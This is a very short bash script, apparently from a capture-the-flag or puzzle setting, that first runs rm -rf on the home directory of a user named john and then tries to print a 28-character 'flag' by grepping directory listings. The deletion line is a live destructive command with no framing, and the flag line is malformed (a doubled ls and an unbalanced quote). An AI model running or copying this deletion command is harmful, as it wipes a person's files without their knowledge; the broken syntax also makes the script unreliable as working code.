#!/bin/bash 
rm -rf /home/john/
echo "Flag is: $(ls | ls | grep -o '[0-9a-zA-Z]\{28\})"
